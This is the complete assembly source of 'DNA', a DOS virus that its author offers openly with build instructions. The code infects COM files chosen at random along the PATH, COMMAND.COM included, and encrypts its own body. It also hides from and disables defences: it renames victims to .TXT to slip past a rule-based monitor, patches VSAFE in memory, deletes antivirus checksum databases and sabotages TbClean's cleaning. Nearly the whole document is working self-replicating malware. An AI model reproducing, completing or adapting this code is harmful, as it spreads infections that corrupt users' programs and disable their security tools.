;=============================================================================
;     Please feel free to distribute, but do NOT change and say it's your's!
;=============================================================================
; Introducing to you the source code of DNA. DNA is a partially resident  
; parasitic COM file infector including COMMAND.COM. The virus infects files
; in a random way along the path. The infection routine is resident 
; during the run of the virus. The reason for this is that it is only then 
; possible to encrypt the infection routine whitin the virus. The routine   
; will be resident in the data area of the system so it will use no memory.
; DNA does not contain a payload. Furthermore there are some routines to
; delete CRC checkers and to disable some resident viruscheckers in memory. 
;
; Greetings ,ThE wEiRd GeNiUs
;-----------------------------------------------------------------------------
;            Assemble with TASM 2.0 or higher, Link with TLINK /T
;-----------------------------------------------------------------------------
	CODE    SEGMENT
	ASSUME  CS:CODE,DS:CODE,ES:CODE,SS:CODE

	CRYPTLEN EQU     BUFFER-CSTART  ;Length to en/decrypt.
	VIRLEN   EQU     BUFFER-VSTART  ;Length of virus.
	MINLEN   EQU     1000           ;Min file length to infect.
	MAXLEN   EQU     0F230h         ;Max  "      "    "    "
	CR       EQU     0Dh            ;Return.
	LF       EQU     0Ah            ;Line feed.
	TAB      EQU     09h            ;Tab.
	TSR2LEN  EQU     BUFFER-INFECT  ;Length of infection Interrupt.
	LENGTH   EQU     NOTENC-CSTART  ;Length of encrypted code.

	ORG     0100h

	.RADIX  16
;-----------------------------------------------------------------------------
; Infected dummy program. (Only in 1st run)
;-----------------------------------------------------------------------------
START:  JMP     VSTART                  ;Jump to virus code.
;-----------------------------------------------------------------------------
; Begin of the virus code.
;-----------------------------------------------------------------------------
VSTART: CALL    CHKDOS                  ;Confuse anti-viral progs.
	CALL    CHKTIME                 ;It's hard to believe but this code
	JMP     BEGIN                   ;stops tracing TBAV into the code! 
;-----------------------------------------------------------------------------
CHKDOS: MOV     AH,30h                  ;Get DOS version.
	INT     21h                     ;Call DOS.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
CHKTIME:MOV     AH,2Ch                  ;Get system time.
	INT     21h                     ;Call DOS.
	CMP     DL,0                    ;If zero,
	JE      CHKTIME                 ;try again.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
VAL_1   DB      00h                     ;Encryption Value.
;-----------------------------------------------------------------------------
ENCRYP: CALL    NEXTL                   ;-Get BP on address.
NEXTL:  POP     BP                      ;/
	SUB     BP,04                   ;[BX]=decryption key.
	MOV     DL,[BP]                 ;DL=[BX]
	LEA     BX,[BP+OFFSET CSTART-VAL_1];De/en-crypt from here.
	CMP     DL,0                    ;Code Encrypted?
	JE      NTENC                   ;Nope
DECRYPT:MOV     DH,DL                   ;
	MOV     CX,CRYPTLEN             ;Set counter.
X_LOOP: XOR     [BX],DL                 ;Xor the code on address BX.
	SUB     DL,DH                   ;-To change form of scrambled code.
	SUB     DH,02Eh                 ;/
	INC     BX                      ;Increase address.
	LOOP    X_LOOP                  ;Repeat until done.
NTENC:  RET                             ;Return to caller.
;-----------------------------------------------------------------------------
BEGIN:  CALL    ENCRYP                  ;Call decryption routine.
;-----------------------------------------------------------------------------
; From here the code will be encrypted.
;-----------------------------------------------------------------------------
CSTART: CALL    BEGIN1                  ;Same old trick.
	CALL    RESBEG                  ;Restore begin.
	CALL    CHKDRV                  ;Check drive & DOS version.
	CALL    SAVEDIR                 ;Save startup directory.
	CALL    INSTSR2                 ;Place infection routine in memory.
	PUSH    ES                      ;In the next sessions ES is modified.
	CALL    INT24                   ;NoErrorAllowed.
	CALL    VSAFE                   ;Vsafe resident?
	POP     ES                      ;Restore extra segment.
	CALL    ENKEY                   ;Create new CRYPTKEY.
	CALL    DTA                     ;Store old and give up new DTA addres.
	CMP	BYTE PTR[BP+OFFSET COMSIGN],01h;Am I command.com?
	JE	F_FIRST			;Yes, do not use the path.
	CALL    FIND1                   ;Determine how many path's are present.
	CALL    RANDOM                  ;Random value for directory search.
	CALL    FIND2                   ;Find suitable directory.
	CALL    CHDRIVE                 ;If it is on another drive.
	CALL    GODIR                   ;Go to the selected directory.
F_FIRST:MOV     AH,4Eh                  ;Search for 1st *.COM
	MOV     CX,110b                 ;Look for read only, system & hidden.
	LEA     DX,[BP+OFFSET SPEC]     ;Offset file specification.(*.COM)
	INT     21h                     ;Call DOS.
	JNC     OPENF                   ;Exit if no file found.
	CALL    EXIT1                   ;No files found, quit.
OPENF:  CALL    CHKCOM                  ;-Is it COMMAND.COM?
	CMP     CX,00h                  ;/
	JNE     NOCOM                   ;Yes, set COMSIGN
	MOV	BYTE PTR[BP+OFFSET COMSIGN],01h;
	JMP     YESCOM			;
NOCOM:	MOV	BYTE PTR[BP+OFFSET COMSIGN],00h;
YESCOM:	CALL    CHKINF                  ;Already infected?
	CALL    ATTRIB                  ;Ask & clear file attributes.
	CALL    RENAME                  ;Rename to *.TXT file.
	MOV     AH,4Eh                  ;Search the name.TXT file.
	MOV     CX,110b                 ;Read only, system & hidden.
	LEA     DX,[BP+OFFSET NEWNAM]   ;Offset file specification.(name.TXT)
	INT     21h                     ;Call DOS.
	MOV     AX,3D02h                ;Open file with read and write access.
	LEA     DX,[BP+OFFSET NEWNAM]   ;Offset file specification.(name.TXT)
	INT     21h                     ;Call DOS.
	MOV     BYTE PTR[BP+OFFSET HANDLE],AL;Save file handle.
	CALL    STIME                   ;Save file date & time.
CHECK:  MOV     AH,3Fh                  ;Read begin of victim.
	MOV     CX,3                    ;Read Begin.
	LEA     DX,[BP+OFFSET ORIGNL]   ;Into offset original instructions.
	INT     21h                     ;Call DOS.
	JC      CLOSE                   ;On error, quit.
REPLACE:CALL    BPOINT                  ;Move file pointer to end of victim.
	SUB     AX,3                    ;Calculate new jump.
	MOV     WORD PTR[BP+NEWJMP+1],AX;Store new jump value.
	MOV     AX,4200h                ;Move file pointer to begin.
	XOR     CX,CX                   ;Zero high nybble.
	XOR     DX,DX                   ;Zero low nybble.
	INT     21h                     ;Call DOS.
	MOV     AH,40h                  ;Write to file,
	MOV     CX,3                    ;3 Bytes.
	LEA     DX,[BP+OFFSET NEWJMP]   ;Offset new jump value.
	INT     21h                     ;Call DOS.
	CALL    BPOINT                  ;Move file pointer to end.
	JMP     INFEC                   ;Create encryption key.
LETSGO: MOV     AH,4Fh                  ;Find next.
	INT     21h                     ;Call DOS.
	JC      EXIT                    ;On error, quit.
	JMP     OPENF                   ;Open new victim.
INFEC:  MOV     DL,[BP+OFFSET VAL_1]    ;Encryption value into DL.
	INT     0D0h                    ;Neat way to infect a file!
CLOSE:  CALL    RTIME                   ;Restore File time & date.
	MOV     AH,3Eh                  ;Close file.
	INT     21h                     ;Call DOS.
	CALL    RENAME2                 ;Restore back to COM file.
	CALL    RATTRIB                 ;Restore File attributes.
;-----------------------------------------------------------------------------
EXIT:   CALL    DELSTUF                 ;Delete CRC checkers.
EXIT1:  MOV     AH,1Ah                  ;Restore old DTA.
	MOV     DX,[BP+OFFSET OLD_DTA]  ;Old DTA address.
	INT     21h                     ;Call DOS.
EXIT2:  MOV     AH,0Eh                  ;Restore startup drive.
	MOV     DL,BYTE PTR[BP+OFFSET OLDRV];Old drive code.
	INT     21h                     ;Call DOS.
	MOV     AH,3Bh                  ;Goto startup directory,
	LEA     DX,[BP+OFFSET BUFFER]   ;that is stored here.
	INT     21h                     ;Call DOS.
EXIT3:  CALL    RINTD0                  ;Restore original INT D0
	CALL    RINT24                  ;Restore original INT 24
EXIT4:  MOV     AX,100h                 ;Return address.
	PUSH    AX                      ;Put it on stack.
	RET                             ;Pass control to HOST.
;-----------------------------------------------------------------------------
DUMEX:  MOV     DI,0100h                ;This is a dummy exit, it screws up
	LEA     SI,[BP+DEXIT]           ;TbClean. In stead of cleaning the
	MOV     CX,3                    ;phile, it puts a program terminating
	REPNZ   MOVSB                   ;interrupt in the beginning of the 
	MOV     AX,0100h                ;victim, neat huh!
	PUSH    AX                      ;
	RET                             ;
;-----------------------------------------------------------------------------
BETWEEN:MOV     AH,3Eh                  ;Close the file.
	INT     21h                     ;Call DOS
	JMP     LETSGO                  ;Find next file.
CHKINF: MOV     AX,3D00h                ;Open file with only read acces.
	MOV     DX,WORD PTR[BP+OFFSET NP];Offset filename.
	INT     21h                     ;Call DOS.
	MOV     BX,AX                   ;File handle into BX.
	XOR     CX,CX                   ;- 
	XOR     DX,DX                   ;/
	MOV     AX,4202h                ;Move file pointer to end.
	INT     21h                     ;Call DOS.
	SUB     AX,VIRLEN               ;
	MOV     DX,AX                   ;
	MOV     AX,4200h                ;Move file pointer to vircode.
	INT     21h                     ;Call DOS.
	MOV     AH,3Fh                  ;Read file.
	MOV     CX,01h                  ;One Byte.
	LEA     DX,[BP+OFFSET MARK1]    ;Into this address.
	INT     21h                     ;Call DOS.
	CMP     BYTE PTR [BP+OFFSET MARK1],0E8h; Is it infected?
	JE      BETWEEN                 ;Yes, find another.
	CALL    BPOINT                  ;Go to EOF.
	CMP     AX,MAXLEN               ;Is the file to long?
	JNB     BETWEEN                 ;Yes, find another.
	CMP     AX,MINLEN               ;Is it to short?
	JBE     BETWEEN                 ;Yes, find another.
	MOV     AH,3Eh                  ;Close the file.
	INT     21h                     ;Call DOS
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
CHKDRV: CALL    CHKDOS                  ;Check DOS version.
	CMP     AL,01                   ;
	JB      DUMEX                   ;Screw up TbClean.
	CMP     AL,05h                  ;Is it DOS 5.0 or higher?
	JNGE    EXIT4                   ;No, exit.
	MOV     AH,19h                  ;Get drive code.
	INT     21h                     ;Call DOS.
	MOV     BYTE PTR[BP+OFFSET OLDRV],AL;Save old drive code.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
RESBEG: LEA     SI,[BP+OFFSET ORIGNL]   ;Offset original begin.
	MOV     DI,0100h                ;Restore original instructions.
	MOV     CX,3                    ;Restore 3 bytes.
	REPNZ   MOVSB                   ;Move them.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
CHKCOM: MOV     CX,05                   ;CX=len COMMAND.
	MOV     DI,[BP+OFFSET NP]       ;Offset found file.
	LEA     SI,[BP+OFFSET COMMND]   ;Offset COMMAND.
	REPZ    CMPSB                   ;Compare the strings.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
RENAME: MOV     CX,0Ch                  ;       This section renames the
	MOV     SI,WORD PTR[BP+OFFSET NP];      found and approved for
	LEA     DI,WORD PTR[BP+OFFSET NEWNAM];  infection file to a
	REPNZ   MOVSB                   ;       *.TXT file. The reason for
	LEA     BX,WORD PTR[BP+OFFSET NEWNAM-1];this is that VPROTECT from
LPOINT: INC     BX                      ;       Intel has a rule based NLM.
	CMP     BYTE PTR[BX],'.'        ;       If we write to a COM file
	JNE     LPOINT                  ;       VPROTECT gives an alarm
	MOV     DI,BX                   ;       message. However, if we
	MOV     WORD PTR[BP+OFFSET TXTPOI],BX;  write to a text file....
	LEA     SI,[BP+OFFSET TXT]      ;       Pretty solution isn't it?
	MOVSW                           ;
	MOVSW                           ;
	MOV     DX,WORD PTR[BP+OFFSET NP];
	LEA     DI,WORD PTR[BP+OFFSET NEWNAM];
	MOV     AH,56h                  ;Rename file function.
	INT     21h                     ;Call DOS.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
RENAME2:LEA     SI,[BP+OFFSET SPEC+1]   ;       In this section we
	MOV     DI,WORD PTR[BP+OFFSET TXTPOI];  give the infected file
	MOVSW                           ;       its old extention back.
	MOVSW                           ;       (*.COM)
	MOV     DX,WORD PTR[BP+OFFSET NP];
	LEA     DI,WORD PTR[BP+OFFSET NEWNAM];
	MOV     AH,56h                  ;Rename file function.
	INT     21h                     ;Call DOS.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
ENKEY:  CALL    CHKTIME                 ;Get time.
	MOV     BYTE PTR[BP+OFFSET VAL_1],DL;New encryption key.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
SAVEDIR:MOV     BYTE PTR[BP+OFFSET BUFFER],5Ch;
	MOV     DL,BYTE PTR[BP+OFFSET OLDRV];Drive code.
        INC     DL                      ;DL=DL+1 as func 47 is different.
	MOV     AH,47h                  ;Get current directory.
	LEA     SI,[BP+OFFSET BUFFER+1] ;Store current directory.
	INT     21h                     ;Call DOS.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
DTA:    MOV     AH,2Fh                  ;Get DTA address.
	INT     21h                     ;Call DOS.
	MOV     WORD PTR[BP+OFFSET OLD_DTA],BX; Save here.
	LEA     DX,[BP+OFFSET NEW_DTA]  ;Offset new DTA address.
	MOV     AH,1Ah                  ;Give up new DTA.
	INT     21                      ;Call DOS.
	ADD     DX,1Eh                  ;Filename pointer in DTA.
	MOV     WORD PTR[BP+OFFSET NP],DX;Put in name pointer.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
INT24:  MOV     AX,3524h                ;Get int 24 handler.
	INT     21h                     ;into [ES:BX].
	MOV     WORD PTR[BP+OLDINT],BX  ;Save it.
	MOV     WORD PTR[BP+OLDINT+2],ES;
	MOV     AH,25h                  ;Set new int 24 handler.
	LEA     DX,[BP+OFFSET NEWINT]   ;DS:DX->new handler.
	INT     21h                     ;Call DOS.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
RINT24: PUSH    DS                      ;Save data segment.
	MOV     AX,2524h                ;Restore int 24 handler
	LDS     DX,[BP+OFFSET OLDINT]   ;to original.
	INT     21h                     ;Call DOS.
	POP     DS                      ;Restore data segment.
	RET                             ;Return to caller.
;---------------------------------------------------------------------------
RINTD0: PUSH    DS                      ;Save data segment.
	MOV     AX,25D0h                ;Restore int D0 handler
	LDS     DX,[BP+OFFSET INTD0]    ;to original.
	INT     21h                     ;Call DOS.
	POP     DS                      ;Restore data segment.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
VSAFE:  MOV     AX,3516h                ;Get interrupt vector INT 16.
	INT     21h                     ;(Now we know in wich segment it is.)
	ADD     BX,0364h                ;Here we find a jump that we'll change.
	CMP     WORD PTR[ES:BX],0945h   ;Is it THE jump?
	JNE     OK_9                    ;No, already modified or not resident.
	MOV     WORD PTR[ES:BX],086Dh   ;Yes, modify it.
OK_9:   RET                             ;Return to caller. No Vsafe.
;-----------------------------------------------------------------------------
FIND1:  MOV     BYTE PTR[BP+OFFSET VAL_2],0FFh; This routine is derived from
        MOV     BX,01h                  ; the VIENNA virus. (Why invent the 
FIND2:  PUSH    ES                      ; wheel twice?)
        PUSH    DS                      ;- Save registers.
	MOV     ES,DS:2CH               ;
	MOV     DI,0                    ;ES:DI points to environment.
FPATH:  LEA     SI,[BP+OFFSET PATH]     ;Point to "PATH=" string in data area.
	LODSB                           ;
	MOV     CX,OFFSET 8000H         ;Environment can be 32768 bytes long.
	REPNZ   SCASB                   ;Search for first character.
	MOV     CX,4                    ;Check if path
LOOP_2: LODSB                           ;is complete.
	SCASB                           ;
	JNZ     FPATH                   ;If not all there, abort & start over.
	LOOP    LOOP_2                  ;Loop to check the next character.
	XCHG    SI,DI                   ;Exchange registers.
	MOV     CL,BYTE PTR[BP+OFFSET VAL_2];Random value in CL.
	PUSH    ES                      ;\
	POP     DS                      ;-) Get DS, ES on address.
	POP     ES                      ;/
OK_14:  LEA     DI,[BP+OFFSET NEW_DTA+50];Offset address path.
OK_10:  MOVSB                           ;Get name in path.
	MOV     AL,[SI]                 ;
	CMP     AL,0                    ;Is it at the end?
	JE      OK_11                   ;Yes, replicate.
	CMP     AL,3Bh                  ;Is it ';'?
	JNE     OK_10                   ;Nope, next letter.
	INC     SI                      ;For next loop. ';'=';'+1.
	INC     BX                      ;
	LOOP    OK_14                   ;Loop until random value = 0.
OK_11:  POP     DS                      ;Restore data segment.
	MOV     AL,0                    ;Place space after the directory.
	MOV     [DI],AL                 ;
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
DELSTUF:MOV     BX,01h                  ;Set counter
	PUSH    BX                      ;and push it.
	LEA     DX,[BP+OFFSET MICRO]    ;Is there a CHKLIST.MS file?
	JMP     INTER                   ;Check it out.
SECOND: LEA     DX,[BP+OFFSET TBAV]     ;Is there a ANTI-VIR.DAT file?
	INC     BX                      ;Increase counter
	PUSH    BX                      ;and push it.
	JMP     INTER                   ;Check it out.
THIRD:  LEA     DX,[BP+OFFSET CENTRAL]  ;Is there a CHKLIST.CPS file?
	INC     BX                      ;Increase counter
	PUSH    BX                      ;and push it
INTER:  MOV     AH,4Eh                  ;Find first matching entry.
	MOV     CX,110b                 ;Search all attributes.
	INT     21h                     ;Call DOS.
	JC      NODEL                   ;No match, find next.
	CALL    ATTRIB                  ;Clear attributes.
	MOV     AH,41h                  ;Delete file.
	INT     21h                     ;Call DOS.
NODEL:  POP     BX                      ;Pop counter.
	CMP     BX,01                   ;Had the first one?
	JE      SECOND                  ;Yes, do the second.
	CMP     BX,02                   ;Was it the second?
	JE      THIRD                   ;Yes, do the third.
	RET                             ;Finished, return to caller.
;-----------------------------------------------------------------------------
CHDRIVE:MOV     CX,0FFFFh               ;Clear CX.
	MOV     BL,'A'-1                ;AH=40
OK_15:  INC     BL                      ;AH=41='A'
	INC     CX                      ;CX=1
	CMP     BL,BYTE PTR[BP+OFFSET NEW_DTA+50];New drive letter.
	JNE     OK_15                   ;Not the same, go again.
	MOV     DL,CL                   ;Calculated the new drive code.
	MOV     AH,0Eh                  ;Give up new drive code.
	INT     21h                     ;Call DOS.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
RTIME:  MOV     AX,5701h                ;Restore time & date.
	MOV     CX,WORD PTR[BP+OFFSET TIME];Old time.
	MOV     DX,WORD PTR[BP+OFFSET DATE];Old date.
	INT     21h                     ;Call DOS.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
STIME:  MOV     AX,5700h                ;Get file date & time.
	MOV     BX,[BP+OFFSET HANDLE]   ;File Handle.
	INT     21h                     ;Call DOS.
	MOV     WORD PTR[BP+OFFSET TIME],CX;Store time.
	MOV     WORD PTR[BP+OFFSET DATE],DX;Store date.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
BPOINT: XOR     DX,DX                   ;Zero register.
	MOV     AX,4202h                ;Move file pointer to top.
	XOR     CX,CX                   ;Zero register.
	INT     21h                     ;Call DOS.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
ATTRIB: MOV     DX,WORD PTR[BP+OFFSET NP];Offset in DTA.
	MOV     AX,4300h                ;Ask file attributes.
	INT     21h                     ;Call DOS.
	LEA     BX,[BP+OFFSET ATTR]     ;Save address for old attributes.
	MOV     [BX],CX                 ;Save it.
	XOR     CX,CX                   ;Clear file attributes.
	MOV     AX,4301h                ;Write file attributes.
	INT     21h                     ;Call DOS.
	JNC     OK                      ;No error, proceed.
	CALL    EXIT                    ;Oh Oh, error occured. Quit.
OK:     RET                             ;Return to caller.
;-----------------------------------------------------------------------------
RATTRIB:LEA     DX,[BP+OFFSET NEWNAM]   ;Offset file specification.(name.TXT)
	LEA     BX,[BP+OFFSET ATTR]     ;Offset address old attributes.
	MOV     CX,[BX]                 ;Into CX.
	MOV     AX,4301h                ;Write old values back.
	INT     21h                     ;Call DOS.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
GODIR:  LEA     DX,[BP+OFFSET NEW_DTA+52];Offset directory spec.
	MOV     AH,3Bh                  ;Goto the directory.
	INT     21h                     ;Call DOS.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
RANDOM: CALL    CHKTIME                 ;Get system time.
	MOV     CX,0                    ;Figure this out by yourself.
	MOV     AX,100d                 ;It is a random generator with
OK_19:  INC     CX                      ;two variable inputs.
	SUB     AX,BX                   ;A: How many dir's in the path.
        CMP     AX,01d                  ;B: Random system time.
	JGE     OK_19                   ;With this values, we create a
	XOR     BX,BX                   ;random value between 1 and A.
OK_20:  INC     BX                      ;
	SUB     DL,CL                   ;
	CMP     DL,01d                  ;
	JGE     OK_20                   ;
	MOV     BYTE PTR[BP+OFFSET VAL_2],BL;Save value.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
BEGIN1: PUSH    SP                      ;
	POP     BX                      ;Everything is related to BP.
	MOV     BP,WORD PTR[BX]         ;
	SUB     BP,0145h                ;In first run BP=0
	RET                             ;
;-----------------------------------------------------------------------------
NEWINT: MOV     AL,03h                  ;New INT 24.
	IRET                            ;No more write protect errors!
;-----------------------------------------------------------------------------
INSTSR2:PUSH    ES                      ;-Save registers.
	PUSH    DS                      ;/
	MOV     AX,0DEDEh               ;Resident check.       
	INT     21h                     ;Call DOS.       
	CMP     AH,41h                  ;\
	JNE     NOBRO                   ;-Little Brother virus in memory?
	CALL    EXIT4			;If resisent, do nothing.
NOBRO:  MOV	AX,3D3Dh		;Resident check.
	INT	21h			;Call DOS.
	CMP	AX,1111h		;\
	JNE	NOGETP			;-Getpass! virus resident ?.
	CALL	EXIT4			;If resident, quit.
NOGETP:	MOV     AX,35D0h                ;Save old interrupt vector INT D0. 
	INT     21h                     ;Call DOS.
	MOV     WORD PTR[BP+OFFSET INTD0],BX
	MOV     WORD PTR[BP+OFFSET INTD0+2],ES
	MOV     AX,0044h                ;
	MOV     ES,AX                   ;       
	MOV     DI,0100h                ;
	LEA     SI,[BP+OFFSET INFECT]   ;Offset address infection routine.
	MOV     CX,TSR2LEN              ;Length to install.
	REP     MOVSB                   ;Install it.
	PUSH    ES                      ;
	POP     DS                      ;
	MOV     AX,25D0h                ;Give up new INT D0 vector.
	MOV     DX,0100h                ;
	INT     21h                     ;Call DOS.
	POP     DS                      ;
	POP     ES                      ;
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
PATH    DB      'PATH='                 ;Used to find environment.
SPEC    DB      '*.COM',0               ;File search specification.
TXT     DB      '.TXT',0                ;Rename file specification.
OUTPUT  DB      0                       ;Output byte to printer.
TXTPOI  DW      0                       ;Pointer in specification.
MARK1   DB      0                       ;Used for infection check.
VAL_2   DB      0                       ;Random value for directory switching.
OLDRV   DB      0                       ;Old drive code.
BEGIN2  DW      0                       ;
NWJMP1  DB      0EBh,0                  ;
FLAGT   DB      0                       ;
COMMND  DB      'COMM',0                ;
MICRO   DB      'CHKLIST.MS',0          ;- Files to be deleted.
CENTRAL DB      'CHKLIST.CPS',0         ;/
TBAV    DB      'ANTI-VIR.DAT',0        ;/
VIRNAME DB      ' Wrong copied DNA = Evolution '
	DB      ' I am Life.'
	DB      ' Greetings ,ThE wEiRd GeNiUs '
OLD_DTA DW      0                       ;Old DTA addres.
HANDLE  DW      0                       ;File handle.
COMSIGN DB	0			;Command.com flag
TIME    DB      2 DUP (?)               ;File time.
DATE    DB      2 DUP (?)               ;File date.
ATTR    DB      1 DUP (?),0             ;Attributes.
INTD0   DW      0,0                     ;       
NEWJMP  DB      0E9h,0,0                ;Jump replacement.
ORIGNL  DB      0CDh,020h,090h          ;Original instrucitons.
DEXIT   DB      0CDh,020h,090h          ;Dummy exit instructions.
NEWNAM  DB      0Dh DUP (?)             ;New file name.
OLDINT  DW      0                       ;Old INT 24 vector.
NP      DW      ?                       ;New DTA address.
;-----------------------------------------------------------------------------
INFECT: PUSH    BX                      ;Save file handle.
	PUSH    DX                      ;Save encryption key.
	PUSH    BX                      ;Save file handle.
	CALL    DNCRYPT                 ;Encrypt the virus code.
	POP     BX                      ;Restore file handle.
	LEA     DX,[BP+OFFSET VSTART]   ;Begin here.
	MOV     CX,VIRLEN               ;Write this many Bytes.
	MOV     AH,40h                  ;Write to file.
	INT     21h                     ;Call DOS.
	POP     DX                      ;Restore encryption value.
	CALL    DNCRYPT                 ;Fix up the mess.
	POP     BX                      ;Restore file handle.
DUMMY:  IRET                            ;Return to caller.
;-----------------------------------------------------------------------------
DNCRYPT:LEA     BX,[BP+OFFSET CSTART]   ;De/en-crypt from here.
	MOV     DH,DL                   ;
	MOV     CX,CRYPTLEN             ;Set counter.
Y_LOOP: XOR     [BX],DL                 ;Xor the code on address BX.
	SUB     DL,DH                   ;-To change form of scrambled code.
	SUB     DH,02Eh                 ;/
	INC     BX                      ;Increase address.
	LOOP    Y_LOOP                  ;Repeat until done.
NOTENC: RET                             ;Return to caller.
;-----------------------------------------------------------------------------
BUFFER: DB      64 DUP (?)              ;Here we store directory info.
;-----------------------------------------------------------------------------
NEW_DTA:                                ;Here we put the DTA copy.
;-----------------------------------------------------------------------------
CODE ENDS
END START
;=============================================================================
